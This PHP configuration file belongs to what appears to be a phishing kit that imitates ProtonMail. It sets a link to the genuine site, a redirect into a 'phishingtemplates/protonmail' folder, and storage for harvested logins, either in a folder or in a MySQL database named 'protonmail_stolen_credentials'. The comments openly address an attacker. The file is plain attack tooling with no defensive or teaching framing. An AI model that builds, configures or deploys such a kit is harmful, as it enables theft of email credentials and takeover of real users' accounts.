<?php
# Config file for protonmail phishing template

$protonmail_link = "https://protonmail.com"; // linking
$protonmail_main_page_redirect = $_SERVER['PHP_SELF']."/../../../../phishingtemplates/protonmail/"; # dont delete this

// If attacker wanna use database instead of storing stolen credentials
// in folder, you can set $use_db set to true (DEFAULT: false).
$use_db = false;

// database config
// set your own credentials
$db_host = "localhost"; // your host
$db_user = "root"; // your mysql user
$db_pass = ""; // your mysql password (DEFAULT: empty).
$db_name = "protonmail_stolen_credentials"; // your database name
?>
